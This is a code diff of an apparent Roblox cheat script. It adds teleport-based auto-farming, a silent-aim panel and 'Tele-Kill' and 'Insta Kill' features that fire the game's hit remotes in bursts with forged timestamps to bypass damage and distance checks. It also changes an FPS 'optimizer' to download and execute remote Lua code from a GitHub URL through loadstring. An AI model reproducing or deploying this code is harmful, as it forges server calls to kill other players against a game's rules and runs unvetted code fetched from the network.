+                        local ACTIVE_STATIONS = {}
+                        local to_fill = SEL_QTY
+
+                        NOTIFY("Auto Extract", "Phase 1: Filling " .. SEL_QTY .. " stations...", 3)
+
+                        while to_fill > 0 and EXT_RUNNING do
+                            local st = FIND_AVAILABLE_STATION()
+                            if st then
+                                local already = false
+                                for _, used in ipairs(ACTIVE_STATIONS) do
+                                    if used == st then
+                                        already = true
+                                        break
+                                    end
+                                end
+
+                                if not already then
+                                    BYPASS_TP(st.StatusPart.Position); task.wait(0.5)
+                                    GET_TOOL("Water"); FORCE_HOLD(st.StatusPart.DrankStatusPrompt); task.wait(1.2)
+                                    GET_TOOL("Sugar"); FORCE_HOLD(st.StatusPart.DrankStatusPrompt); task.wait(0.6)
+                                    GET_TOOL(SEL_EXTRACT); FORCE_HOLD(st.StatusPart.DrankStatusPrompt)
+
+                                    table.insert(ACTIVE_STATIONS, st)
+                                    to_fill = to_fill - 1
+                                    NOTIFY("Auto Extract", "Station " .. #ACTIVE_STATIONS .. " started!", 2)
+                                else
+                                    task.wait(1)
+                                end
+                            else
+                                task.wait(2)
+                            end
+                        end
+
+                        if not EXT_RUNNING then break end
+                        NOTIFY("Auto Extract", "Phase 2: Harvesting...", 3)
+
+                        local done = 0
+                        while done < SEL_QTY and EXT_RUNNING do
+                            for idx, st in ipairs(ACTIVE_STATIONS) do
+                                if st ~= "DONE" then
+                                    local cp = st.PlaceCup.DrankPlaceCupPrompt
+                                    if cp.Enabled then
+                                        BYPASS_TP(st.StatusPart.Position); task.wait(0.4)
+                                        -- Step 4: Add Cups
+                                        NOTIFY("Auto Extract", "Adding cups to station " .. idx, 2)
+                                        for _ = 1, 2 do
+                                            GET_TOOL("Empty Cup"); FORCE_HOLD(cp); task.wait(0.6)
+                                        end
+
+                                        -- Step 5: Pour
+                                        local pourP = st.Water:FindFirstChild("DrankPourPrompt")
+                                        if pourP then
+                                            while EXT_RUNNING and pourP.Enabled do
+                                                FORCE_HOLD(pourP)
+                                                task.wait(0.1)
+                                            end
+                                        end
+
+                                        -- Step 6: Collect (x3 for safety)
+                                        for _ = 1, 3 do
+                                            FORCE_HOLD(cp)
+                                            task.wait(0.5)
+                                        end
+
+                                        ACTIVE_STATIONS[idx] = "DONE"
+                                        done = done + 1
+                                        NOTIFY("Auto Extract", "Batch " .. done .. " collected!", 2)
+                                    end
+                                end
+                            end
+                            task.wait(1)
+                        end
+                        task.wait(2)
+                    end
+                end)
+            end
         end)
 
-        ADD_TGL(C_EXTRAS, "Auto trap Rob", false, function(v)
-            TrapRobEnabled = v
-            if v then task.spawn(DO_TRAP_LOOP) end
+        local D_EXTRACT = ADD_DRP(C_EXTRACT, "Select Extract: Green Extract", function(v)
+            SEL_EXTRACT = v
         end)
+        D_EXTRACT:ADD_MANY({ "Green Extract", "Red Extract", "Blue Extract", "Pink Extract", "Purple Extract" })
+
+        local D_QTY = ADD_DRP(C_EXTRACT, "Extract Qty: 1", function(v)
+            SEL_QTY = tonumber(v)
+        end)
+        D_QTY:ADD_MANY({ "1", "2", "3", "4", "5", "6" })
     end
 
 
@@ -5202,7 +5100,7 @@ local function BUILD_NYH_UI()
             { { VAL = ESP_CFG.Weapons.Color, CB = function(c) ESP_CFG.Weapons.Color = c end } })
         ADD_ESP_ROW(C1, "Distance", ESP_CFG.Dist.Enabled, function(v) ESP_CFG.Dist.Enabled = v end,
             { { VAL = ESP_CFG.Dist.Color, CB = function(c) ESP_CFG.Dist.Color = c end } })
-        ADD_ESP_ROW(C1, "Chams", ESP_CFG.Chams.Enabled, function(v) ESP_CFG.Chams.Enabled = v end, {
+        ADD_ESP_ROW(C1, "Self Chams", ESP_CFG.Chams.Enabled, function(v) ESP_CFG.Chams.Enabled = v end, {
             { VAL = ESP_CFG.Chams.Color1, CB = function(c) ESP_CFG.Chams.Color1 = c end },
             { VAL = ESP_CFG.Chams.Color2, CB = function(c) ESP_CFG.Chams.Color2 = c end }
         })
@@ -5216,6 +5114,38 @@ local function BUILD_NYH_UI()
         ADD_ESP_ROW(C1, "Skeleton", ESP_CFG.Skeleton.Enabled, function(v) ESP_CFG.Skeleton.Enabled = v end,
             { { VAL = ESP_CFG.Skeleton.Color, CB = function(c) ESP_CFG.Skeleton.Color = c end } })
 
+        -- ── SILENT AIM CARD ────────────────────────────────
+        local C2_SA = MK_CARD(VR, "Silent Aim ", "rbxassetid://80029373400221")
+
+        _G.EXE.SILENT_AIM = _G.EXE.SILENT_AIM or {
+            Enabled = false,
+            Hitbox = "Head",
+            ShowFOV = false,
+            FOV_Radius = 100,
+            WallCheck = true
+        }
+
+        ADD_TGL(C2_SA, "Enable Silent Aim", _G.EXE.SILENT_AIM.Enabled, function(v)
+            _G.EXE.SILENT_AIM.Enabled = v
+        end)
+
+        local SA_HITBOX_DRP = ADD_DRP(C2_SA, "Hitbox: " .. _G.EXE.SILENT_AIM.Hitbox, function(v)
+            _G.EXE.SILENT_AIM.Hitbox = v
+        end)
+        SA_HITBOX_DRP:ADD_MANY({ "Head", "Torso", "Random" })
+
+        ADD_TGL(C2_SA, "Wall Check", _G.EXE.SILENT_AIM.WallCheck, function(v)
+            _G.EXE.SILENT_AIM.WallCheck = v
+        end)
+
+        ADD_TGL(C2_SA, "Show FOV Circle", _G.EXE.SILENT_AIM.ShowFOV, function(v)
+            _G.EXE.SILENT_AIM.ShowFOV = v
+        end)
+
+        ADD_SLD(C2_SA, "FOV Size", 10, 500, _G.EXE.SILENT_AIM.FOV_Radius, function(v)
+            _G.EXE.SILENT_AIM.FOV_Radius = v
+        end, "px")
+
         -- ── INSTA KILL CARD ────────────────────────────────
         local C3 = MK_CARD(VR, "Insta Kill ⚠️", "rbxassetid://140547169969789")
         for _, v in pairs(C3:GetDescendants()) do
@@ -5224,289 +5154,212 @@ local function BUILD_NYH_UI()
                 break
             end
         end
-        local SelectedIKPlayer = nil
 
-        local function IK_HAS_SHIELD(c)
-            return c and (c:FindFirstChild("ForceFieldSpawn") or c:FindFirstChild("ForceFieldGZ"))
-        end
-
+        _G.EXE.IK_TARGET = "None"
         local IK_DRP = ADD_DRP(C3, "Select Player", function(v)
-            local rawName = string.gsub(v, "🛡️ ", "")
-            local target = game.Players:FindFirstChild(rawName)
-            if target then
-                SelectedIKPlayer = target
-                if IK_HAS_SHIELD(target.Character) then
-                    NOTIFY("Shield Warning", target.DisplayName .. " has a Spawn Shield active.", 3)
+            _G.EXE.IK_TARGET = v
+        end)
+
+        local function UPD_IK_LIST()
+            local names = {}
+            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
+                if p ~= LPLR then
+                    pcall(function()
+                        local C = p.Character or workspace:FindFirstChild(p.Name)
+                        local UT = C and C:FindFirstChild("UpperTorso")
+                        local isP = false
+                        if UT then
+                            local rk = UT:FindFirstChild("RKSGui")
+                            local sh = UT:FindFirstChild("ShieldGui")
+                            isP = (rk and rk.Enabled) or (sh and sh.Enabled)
+                        end
+                        local displayName = isP and "🛡️ " .. p.Name or p.Name
+                        table.insert(names, displayName)
+                    end)
+                end
+            end
+            table.sort(names)
+            if #names == 0 then
+                table.insert(names, "None")
+            end
+            IK_DRP.REFRESH(names)
+        end
+
+        game:GetService("Players").PlayerAdded:Connect(UPD_IK_LIST)
+        game:GetService("Players").PlayerRemoving:Connect(UPD_IK_LIST)
+        UPD_IK_LIST()
+
+        -- Periodic check for shield status changes
+        task.spawn(function()
+            while true do
+                task.wait(5)
+                if MAIN.Visible then
+                    UPD_IK_LIST()
                 end
             end
         end)
 
-        local function UpdateIKList()
-            local list = {}
-            for _, p in ipairs(game.Players:GetPlayers()) do
-                if p ~= LPLR then
-                    local prefix = ""
-                    if IK_HAS_SHIELD(p.Character) then
-                        prefix = "🛡️ "
-                    end
-                    table.insert(list, prefix .. p.Name)
-                end
-            end
-            IK_DRP.REFRESH(list)
+        local hitRemote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("ValidateHit")
+        local shootRemote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("Shoot")
+        local gunHitRemote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("GunHit")
 
-            local IK_BTN = IK_DRP.FRM and IK_DRP.FRM:FindFirstChildOfClass("TextButton")
-            if SelectedIKPlayer and not game.Players:FindFirstChild(SelectedIKPlayer.Name) then
-                SelectedIKPlayer = nil
-                if IK_BTN then IK_BTN.Text = "  Select Player" end
+        local function EQUIP_WEAPON()
+            local char = LPLR.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if not (char and hum) then return end
+
+            local current = char:FindFirstChildOfClass("Tool")
+            -- Strict check for valid gun
+            local function IS_REAL_GUN(tool)
+                if not tool:IsA("Tool") then return false end
+
+                -- Explicit Blacklist (NYC Specific)
+                local name = tool.Name
+                local blacklist = {
+                    ["Phone"] = true,
+                    ["Fist"] = true,
+                    ["BountyCard"] = true,
+                    ["GunBuilderServer"] = true,
+                    ["Tablet"] = true,
+                    ["Wallet"] = true
+                }
+                if blacklist[name] then return false end
+
+                -- Detection logic
+                if tool:GetAttribute("GunMagAmmo") then return true end
+
+                -- Fallback check for gun-specific parts
+                local h = tool:FindFirstChild("Handle")
+                if h and (h:FindFirstChild("Muzzle") or h:FindFirstChild("Flash") or h:FindFirstChild("Barrel")) then
+                    return true
+                end
+                return false
+            end
+
+            if current and IS_REAL_GUN(current) then
+                return current
+            end
+
+            -- Search in backpack with strictness
+            for _, tool in pairs(LPLR.Backpack:GetChildren()) do
+                if IS_REAL_GUN(tool) then
+                    hum:EquipTool(tool)
+                    task.wait(0.2) -- Necessary for server sync
+                    return tool
+                end
             end
         end
-        UpdateIKList()
-        game.Players.PlayerAdded:Connect(UpdateIKList)
-        game.Players.PlayerRemoving:Connect(UpdateIKList)
 
-        -- Bucle para actualizar pasivamente el escudo sin molestar a la UI
-        task.spawn(function()
-            while task.wait(0.5) do
-                if not (C3 and C3.Parent) then break end -- Prevención de Memory Leaks
+        local function KILL_PLAYER_BURST(targetName)
+            if targetName == "None" then return end
 
-                local IK_BTN = IK_DRP.FRM and IK_DRP.FRM:FindFirstChildOfClass("TextButton")
-                local IK_SCR = IK_DRP.FRM and IK_DRP.FRM:FindFirstChildOfClass("ScrollingFrame")
+            -- Auto-Equip Check
+            local weapon = EQUIP_WEAPON()
+            if not weapon then
+                return NOTIFY("Error", "No weapon found in backpack!", 2)
+            end
 
-                if IK_SCR then
-                    for _, btn in ipairs(IK_SCR:GetChildren()) do
-                        if btn:IsA("TextButton") then
-                            local rawName = string.gsub(btn.Text, "🛡️ ", "")
-                            rawName = string.match(rawName, "[%s]*(.*)") -- Elimina espacios inicianles
-                            if rawName then
-                                local target = game.Players:FindFirstChild(rawName)
-                                if target then
-                                    local hasShield = IK_HAS_SHIELD(target.Character)
-                                    local desiredText = "  " .. (hasShield and "🛡️ " or "") .. target.Name
-                                    if btn.Text ~= desiredText then
-                                        btn.Text = desiredText
-                                    end
-                                end
-                            end
+            -- Clean name from emoji
+            local rawName = targetName:gsub("🛡️ ", "")
+            local target = game:GetService("Players"):FindFirstChild(rawName)
+            local char = target and target.Character
+
+            -- Re-check protection before firing
+            local ut = char and char:FindFirstChild("UpperTorso")
+            local rk = ut and ut:FindFirstChild("RKSGui")
+            local sh = ut and ut:FindFirstChild("ShieldGui")
+            if (rk and rk.Enabled) or (sh and sh.Enabled) then
+                return NOTIFY("Protected", target.Name .. " has the shield!", 2)
+            end
+
+            local head = char and (char:FindFirstChild("HeadHitBox") or char:FindFirstChild("Head"))
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+
+            if head and hum and hum.Health > 0 then
+                local baseTime = workspace:GetServerTimeNow()
+                for i = 1, 15 do -- Small, reliable burst per cycle
+                    local uniqueTime = baseTime + (i * 0.01)
+                    local pos = head.Position
+
+                    task.spawn(function()
+                        shootRemote:FireServer(pos, uniqueTime)
+                        hitRemote:FireServer(pos, char, head, uniqueTime)
+                        gunHitRemote:FireServer(uniqueTime, true, head.Name)
+                    end)
+                end
+            end
+        end
+
+        local function TELE_KILL(targetName)
+            if targetName == "None" then return end
+
+            -- Auto-Equip Check
+            local weapon = EQUIP_WEAPON()
+            if not weapon then
+                return NOTIFY("Error", "No weapon found in backpack!", 2)
+            end
+
+            -- Clean name from emoji
+            local rawName = targetName:gsub("🛡️ ", "")
+            local target = game:GetService("Players"):FindFirstChild(rawName)
+            local char = target and target.Character
+
+            -- Shield block
+            local ut = char and char:FindFirstChild("UpperTorso")
+            local rk = ut and ut:FindFirstChild("RKSGui")
+            local sh = ut and ut:FindFirstChild("ShieldGui")
+            if (rk and rk.Enabled) or (sh and sh.Enabled) then
+                return NOTIFY("Protected", target.Name .. " is protected by shield!", 2)
+            end
+
+            local root = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+
+            if root and hum and LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
+                local oldCF = LPLR.Character.HumanoidRootPart.CFrame
+                NOTIFY("Tele-Kill", "Persistent Pursuit Active: " .. target.Name, 1)
+
+                local isKilling = true
+
+                -- Sticky loop with death check
+                task.spawn(function()
+                    while isKilling and target.Parent and hum.Health > 0 do
+                        -- Re-check shield during loop just in case they turn it on mid-kill
+                        if (rk and rk.Enabled) or (sh and sh.Enabled) then
+                            isKilling = false
+                            NOTIFY("Protected", "Target activated shield!", 2)
+                            break
                         end
+
+                        local targetPos = root.Position
+                        local myNewPos = (root.CFrame * CFrame.new(0, 0, 3)).Position
+
+                        -- Keep following and facing
+                        LPLR.Character.HumanoidRootPart.CFrame = CFrame.new(myNewPos,
+                            Vector3.new(targetPos.X, myNewPos.Y, targetPos.Z))
+
+                        -- Fire a burst every cycle
+                        KILL_PLAYER_BURST(rawName)
+
+                        task.wait(0.12) -- Essential delay to bypass damage caps
                     end
-                end
+                    isKilling = false
 
-                if SelectedIKPlayer and SelectedIKPlayer.Parent and IK_BTN then
-                    local hasShield = IK_HAS_SHIELD(SelectedIKPlayer.Character)
-                    local desiredBtnText = "  " .. (hasShield and "🛡️ " or "") .. SelectedIKPlayer.Name
-                    if IK_BTN.Text ~= desiredBtnText then
-                        IK_BTN.Text = desiredBtnText
-                    end
-                end
+                    task.wait(0.1)
+                    LPLR.Character.HumanoidRootPart.CFrame = oldCF
+                    NOTIFY("Tele-Kill", "Target Confirmed Dead.", 2)
+                end)
+            else
+                NOTIFY("Error", "Target or LocalPlayer missing!", 3)
             end
-        end)
+        end
 
-        ADD_BTN(C3, "Kill Player", function()
-            if IK_HAS_SHIELD(LPLR.Character) then
-                return NOTIFY("Action Blocked", "Please remove your spawn shield before\n attacking.", 3)
-            end
-
-            if not SelectedIKPlayer then return NOTIFY("Error", "Select a player first.", 2) end
-            if not SelectedIKPlayer.Character then return NOTIFY("Error", "Target has no character.", 2) end
-
-            local targetHead = SelectedIKPlayer.Character:FindFirstChild("Head")
-            if not targetHead then return end
-
-            local shield = IK_HAS_SHIELD(SelectedIKPlayer.Character)
-            if shield then
-                return NOTIFY("Shield Warning",
-                    SelectedIKPlayer.DisplayName .. " currently has a spawn shield.", 3)
-            end
-
-            local myChar = LPLR.Character
-            local myHead = myChar and myChar:FindFirstChild("Head")
-            if not myHead then return end
-
-            local tool = myChar:FindFirstChildOfClass("Tool")
-            if not tool then return NOTIFY("Error", "You must equip a weapon first.", 3) end
-
-            local handle = tool:FindFirstChild("Handle")
-            local firePoint = handle and handle:FindFirstChild("GunFirePoint1") or handle
-            local muzzlePoint = handle and handle:FindFirstChild("GunMuzzlePoint1") or handle
-            if not handle then return end
-
-            local Rep = game:GetService("ReplicatedStorage")
-            local Remotes = Rep:WaitForChild("Remotes")
-            local Visualize = Remotes:WaitForChild("VisualizeBullet")
-            local Inflict = Remotes:WaitForChild("InflictTarget")
-            local dpModule = require(Rep:WaitForChild("Modules"):WaitForChild("Utilities"):WaitForChild("DataPacket"))
-            local CreatePacket = dpModule[1]
-
-            local spoofedDistance = 10 -- Bypass max distance limits
-            local direction = (targetHead.Position - myHead.Position).Unit
-
-            task.spawn(function()
-                for i = 1, 25 do
-                    local bulletId = "Bullet_" .. game:GetService("HttpService"):GenerateGUID(true)
-
-                    local bulletSegments = {
-                        { { direction, bulletId } },
-                        { false }
-                    }
-
-                    local extraData = CreatePacket({
-                        ["ChargeLevel"] = 0,
-                        ["ModuleName"] = "1",
-                        ["MousePosition"] = targetHead.Position
-                    })
-                    Visualize:FireServer(tool, handle, bulletSegments, firePoint, muzzlePoint, extraData)
-
-                    local hitData = CreatePacket({
-                        ["BulletId"] = bulletId,
-                        ["ModuleName"] = "1",
-                        ["ClientHitSize"] = targetHead.Size,
-                        ["Distance"] = spoofedDistance,
-                        ["MousePosition"] = nil
-                    })
-                    Inflict:FireServer("Gun", tool, targetHead, hitData)
-                end
-            end)
-            NOTIFY("Success", "Target eliminated: " .. SelectedIKPlayer.DisplayName, 2)
-        end)
-
-        local IK_Auto = false
-        ADD_TGL(C3, "Auto Kill Target", false, function(v)
-            IK_Auto = v
-            if IK_Auto and SelectedIKPlayer then
-                NOTIFY("Auto Kill", "Enabled for " .. SelectedIKPlayer.DisplayName, 2)
-            end
-        end)
-
-        -- Auto Kill Loop
-        task.spawn(function()
-            while task.wait(0.5) do
-                if not (C3 and C3.Parent) then break end -- Detiene el Auto Kill si la ventana se cierra
-
-                if IK_Auto and SelectedIKPlayer and SelectedIKPlayer.Character and SelectedIKPlayer.Character:FindFirstChild("Humanoid") then
-                    if SelectedIKPlayer.Character.Humanoid.Health > 0 and not IK_HAS_SHIELD(SelectedIKPlayer.Character) then
-                        if not IK_HAS_SHIELD(LPLR.Character) then
-                            local myChar = LPLR.Character
-                            local myHead = myChar and myChar:FindFirstChild("Head")
-                            local tool = myChar and myChar:FindFirstChildOfClass("Tool")
-                            local targetHead = SelectedIKPlayer.Character:FindFirstChild("Head")
-
-                            if myHead and tool and targetHead then
-                                local handle = tool:FindFirstChild("Handle")
-                                local firePoint = handle and handle:FindFirstChild("GunFirePoint1") or handle
-                                local muzzlePoint = handle and handle:FindFirstChild("GunMuzzlePoint1") or handle
-
-                                if handle then
-                                    local Rep = game:GetService("ReplicatedStorage")
-                                    local Remotes = Rep:WaitForChild("Remotes")
-                                    local Visualize = Remotes:WaitForChild("VisualizeBullet")
-                                    local Inflict = Remotes:WaitForChild("InflictTarget")
-                                    local dpModule = require(Rep:WaitForChild("Modules"):WaitForChild("Utilities")
-                                        :WaitForChild("DataPacket"))
-                                    local CreatePacket = dpModule[1]
-
-                                    local spoofedDistance = 10
-                                    local direction = (targetHead.Position - myHead.Position).Unit
-
-                                    for i = 1, 5 do -- Reduced burst for the silent loop to avoid trigger flags
-                                        local bulletId = "Bullet_" .. game:GetService("HttpService"):GenerateGUID(true)
-                                        local bulletSegments = { { { direction, bulletId } }, { false } }
-                                        local extraData = CreatePacket({
-                                            ["ChargeLevel"] = 0,
-                                            ["ModuleName"] = "1",
-                                            ["MousePosition"] = targetHead.Position
-                                        })
-                                        Visualize:FireServer(tool, handle, bulletSegments, firePoint, muzzlePoint,
-                                            extraData)
-
-                                        local hitData = CreatePacket({
-                                            ["BulletId"] = bulletId,
-                                            ["ModuleName"] = "1",
-                                            ["ClientHitSize"] = targetHead.Size,
-                                            ["Distance"] = spoofedDistance,
-                                            ["MousePosition"] = nil
-                                        })
-                                        Inflict:FireServer("Gun", tool, targetHead, hitData)
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-
-        -- ── SILENT AIM CARD ────────────────────────────────
-        local C_SA = MK_CARD(VR, "Silent Aim ", "rbxassetid://103054228151622")
-
-        _G.EXE.SILENT_AIM = _G.EXE.SILENT_AIM or {
-            Enabled = false,
-            ShowFOV = false,
-            FOVRadius = 100,
-            HitChance = 100,
-            TargetPart = "Head",
-            WallCheck = false
-        }
-        local SA_CFG = _G.EXE.SILENT_AIM
-
-        ADD_TGL(C_SA, "Enable Silent Aim", SA_CFG.Enabled, function(v)
-            SA_CFG.Enabled = v
-            NOTIFY("Silent Aim", "Silent Aim is now " .. (v and "ON" or "OFF"), 2)
-        end)
-
-        ADD_TGL(C_SA, "Show FOV Circle", SA_CFG.ShowFOV, function(v)
-            SA_CFG.ShowFOV = v
-        end)
-
-        ADD_SLD(C_SA, "FOV Radius", 10, 800, SA_CFG.FOVRadius, function(v)
-            SA_CFG.FOVRadius = v
-        end, "px")
-
-        ADD_SLD(C_SA, "Hit Chance", 0, 100, SA_CFG.HitChance, function(v)
-            SA_CFG.HitChance = v
-        end, "%")
-
-        local SA_PART_DRP = ADD_DRP(C_SA, "Target Part", function(v)
-            SA_CFG.TargetPart = v
-        end)
-        SA_PART_DRP.REFRESH({ "Head", "HumanoidRootPart", "Random" })
-
-        ADD_TGL(C_SA, "Wall Check", SA_CFG.WallCheck, function(v)
-            SA_CFG.WallCheck = v
-        end)
-
-        -- FOV Circle Logic
-        local SA_Circle
-        pcall(function()
-            SA_Circle = Drawing.new("Circle")
-            SA_Circle.Color = Color3.fromRGB(255, 50, 50)
-            SA_Circle.Thickness = 1
-            SA_Circle.NumSides = 64
-            SA_Circle.Radius = SA_CFG.FOVRadius
-            SA_Circle.Transparency = 1
-            SA_Circle.Visible = false
-            SA_Circle.Filled = false
-        end)
-
-        task.spawn(function()
-            local RS = game:GetService("RunService")
-            local UserInputService = game:GetService("UserInputService")
-
-            RS.RenderStepped:Connect(function()
-                if SA_Circle then
-                    local mousePos = UserInputService:GetMouseLocation()
-                    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-                        local vp = workspace.CurrentCamera.ViewportSize
-                        mousePos = Vector2.new(vp.X / 2, vp.Y / 2)
-                    end
-                    SA_Circle.Position = mousePos
-                    SA_Circle.Visible = SA_CFG.ShowFOV and SA_CFG.Enabled
-                    SA_Circle.Radius = SA_CFG.FOVRadius
-                end
-            end)
+        ADD_BTN(C3, "Tele-Kill Player", function()
+            TELE_KILL(_G.EXE.IK_TARGET)
         end)
 
 
-        local C2 = MK_CARD(VL, "Player Visual Settings", "rbxassetid://10734950309")
+        local C2 = MK_CARD(VR, "Player Visual Settings", "rbxassetid://10734950309")
 
         local F_DRP = ADD_DRP(C2, "Text Font", function(v)
             local f          = Fonts[v] or Enum.Font[v]
@@ -5522,7 +5375,7 @@ local function BUILD_NYH_UI()
         ADD_SLD(C2, "Max Render Distance", 100, 5000, ESP_CFG.MaxDist, function(v) ESP_CFG.MaxDist = v end, "st")
 
         -- ── OPTIMIZER CARD ────────────────────────────────
-        local C4 = MK_CARD(VR, "Optimizer", "rbxassetid://72339273614687")
+        local C4 = MK_CARD(VL, "Optimizer", "rbxassetid://72339273614687")
 
         -- Button 1: Lighting & Materials
         local BoosterBtn
@@ -5534,119 +5387,75 @@ local function BUILD_NYH_UI()
             BoosterBtn.Text = "Booster Applied (Active)"
             BoosterBtn.TextColor3 = Color3.fromRGB(150, 150, 150) -- Gray out
 
-            -- Server-side settings requests
-            local SettingsEvent = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvents")
-            SettingsEvent = SettingsEvent and SettingsEvent:FindFirstChild("Settings")
-            if SettingsEvent then
-                SettingsEvent:FireServer("SunRays")
-                SettingsEvent:FireServer("Shadows")
-                SettingsEvent:FireServer("WeatherEffects")
-            end
-
-            game:GetService("Lighting").Brightness = 2
-            game:GetService("Lighting").OutdoorAmbient = Color3.new(1, 1, 1)
-            game:GetService("Lighting").GlobalShadows = false
-
-            for _, effect in pairs(game:GetService("Lighting"):GetChildren()) do
-                if effect:IsA("PostEffect") or effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") then
-                    effect.Enabled = false
-                end
-            end
-
-            local function checkFence(obj)
-                local cur = obj
-                while cur and cur ~= workspace do
-                    if cur.Name:lower():find("fence") or cur.Name:lower():find("fencing") then return true end
-                    cur = cur.Parent
-                end
-                return false
-            end
-
-            for _, obj in pairs(workspace:GetDescendants()) do
-                if checkFence(obj) then
-                    -- RESTORE visibility if it was hidden before
-                    if obj:IsA("BasePart") then
-                        if obj.Transparency > 0 then obj.Transparency = 0 end
-                        -- Keep original material for fences if possible, or at least visible
-                    elseif obj:IsA("Decal") or obj:IsA("Texture") then
-                        obj.Transparency = 0
-                    end
-                else
-                    -- Normal Optimization
-                    if obj:IsA("BasePart") then
-                        obj.Material = Enum.Material.SmoothPlastic
-                    elseif obj:IsA("Decal") or obj:IsA("Texture") then
-                        obj.Transparency = 1
-                    end
-                end
-            end
+            -- Carga el módulo Ultra FPS proporcionado
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Tagger83/FPS2/refs/heads/main/FPS2.lua"))()
+            end)
             NOTIFY("Optimizer", "FPS Booster Deployed!", 3)
         end)
         if _G.EXE.BOOSTER_ACTIVE then BoosterBtn.TextColor3 = Color3.fromRGB(150, 150, 150) end
 
-        -- Button 2: Trees & Vegetation
-        local MapBtn
-        local mapText = _G.EXE.MAP_CLEAN_ACTIVE and "Vegetation Removed (Active)" or "Remove Trees/Vegetation"
+        -- Toggle: FPS Counter
+        local fpsCounterGui
+        local fpsCounterConnection
+        ADD_TGL_KB(C4, "FPS Counter", false, nil, function(v)
+            if v then
+                if fpsCounterGui then return end
 
-        MapBtn = ADD_BTN(C4, mapText, function()
-            if _G.EXE.MAP_CLEAN_ACTIVE then return NOTIFY("Warning", "Map already cleared.", 2) end
-            _G.EXE.MAP_CLEAN_ACTIVE = true
-            MapBtn.Text = "Vegetation Removed (Active)"
-            MapBtn.TextColor3 = Color3.fromRGB(150, 150, 150) -- Gray out
+                local gui = Instance.new("ScreenGui")
+                gui.Name = "FPSCounter"
+                gui.ResetOnSpawn = false
+                gui.IgnoreGuiInset = false
+                gui.Parent = LPLR:WaitForChild("PlayerGui")
 
-            if workspace:FindFirstChild("Vegetation") then workspace.Vegetation:Destroy() end
-            if workspace:FindFirstChild("Trees") then workspace.Trees:Destroy() end
+                local label = Instance.new("TextLabel")
+                label.Parent = gui
+                label.BackgroundTransparency = 1
+                label.Position = UDim2.new(0, 8, 0, 5)
+                label.Size = UDim2.new(0, 200, 0, 40)
 
-            NOTIFY("Optimizer", "Vegetation & Trees removed!", 3)
-        end)
+                label.Font = Enum.Font.Arcade
+                label.TextStrokeTransparency = 0
+                label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+                label.TextScaled = true
+                label.Text = "FPS: 0"
 
-        -- Button 3: Extras (Lights, Trash, Debris)
-        local ExtrasBtn
-        local extrasText = _G.EXE.EXTRAS_ACTIVE and "Extras Removed (Active)" or "Remove Extras"
+                local fps = 0
+                local frames = 0
+                local last = tick()
 
-        ExtrasBtn = ADD_BTN(C4, extrasText, function()
-            if _G.EXE.EXTRAS_ACTIVE then return NOTIFY("Warning", "Extras already removed.", 2) end
-            _G.EXE.EXTRAS_ACTIVE = true
-            ExtrasBtn.Text = "Extras Removed (Active)"
-            ExtrasBtn.TextColor3 = Color3.fromRGB(150, 150, 150) -- Gray out
-
-            -- 1. StreetLights
-            local lightingFolder = workspace:FindFirstChild("Lighting")
-            if lightingFolder and lightingFolder:FindFirstChild("StreetLights") then
-                lightingFolder.StreetLights:Destroy()
-            end
-
-            -- 2. Debris (Blood, Splats, etc)
-            if workspace:FindFirstChild("Debris") then
-                workspace.Debris:Destroy()
-            end
-
-            -- 3. Trash and Props
-            for _, obj in pairs(workspace:GetDescendants()) do
-                if obj:IsA("Model") or obj:IsA("MeshPart") or obj:IsA("Part") then
-                    local name = obj.Name:lower()
-                    if name:find("trash") or name:find("dumpster") or name:find("garbage") then
-                        obj:Destroy()
+                local function getColor(fps)
+                    if fps >= 60 then
+                        return Color3.fromRGB(0, 255, 0)   -- verde
+                    elseif fps >= 30 then
+                        return Color3.fromRGB(255, 170, 0) -- amarillo
+                    else
+                        return Color3.fromRGB(255, 0, 0)   -- rojo
                     end
                 end
+
+                fpsCounterConnection = RS.RenderStepped:Connect(function()
+                    frames = frames + 1
+                    if tick() - last >= 1 then
+                        fps = frames
+                        frames = 0
+                        last = tick()
+                        label.Text = "FPS: " .. fps
+                        label.TextColor3 = getColor(fps)
+                    end
+                end)
+                fpsCounterGui = gui
+            else
+                if fpsCounterGui then
+                    fpsCounterGui:Destroy()
+                    fpsCounterGui = nil
+                end
+                if fpsCounterConnection then
+                    fpsCounterConnection:Disconnect()
+                    fpsCounterConnection = nil
+                end
             end
-
-            NOTIFY("Optimizer", "StreetLights & Trash Removed!", 3)
         end)
-
-        if _G.EXE.MAP_CLEAN_ACTIVE then MapBtn.TextColor3 = Color3.fromRGB(150, 150, 150) end
-        if _G.EXE.EXTRAS_ACTIVE then ExtrasBtn.TextColor3 = Color3.fromRGB(150, 150, 150) end
-
-        -- Footer Note (like owc2.lua)
-        local OPT_NOTE = Instance.new("TextLabel", C4)
-        OPT_NOTE.Size = UDim2.new(1, 0, 0, 20)
-        OPT_NOTE.BackgroundTransparency = 1
-        OPT_NOTE.Text = "Note: Optimizations can only be applied once per session."
-        OPT_NOTE.TextColor3 = Color3.fromRGB(120, 120, 130)
-        OPT_NOTE.Font = Enum.Font.Gotham
-        OPT_NOTE.TextSize = 10
-        OPT_NOTE.TextWrapped = true
-        OPT_NOTE.LayoutOrder = 100
     end
     task.spawn(SETUP_VISUALS)
 
@@ -5676,7 +5485,7 @@ local function BUILD_NYH_UI()
             _G.EXE.GUN_MODS.SpeedBypass = v
             NOTIFY("Movement", "WalkSpeed: " .. (v and "Enabled" or "Disabled"), 2)
         end)
-        ADD_SLD(C_MOV, "Speed Value", 0, 1000, _G.EXE.GUN_MODS.WalkBypassSpeed, function(v)
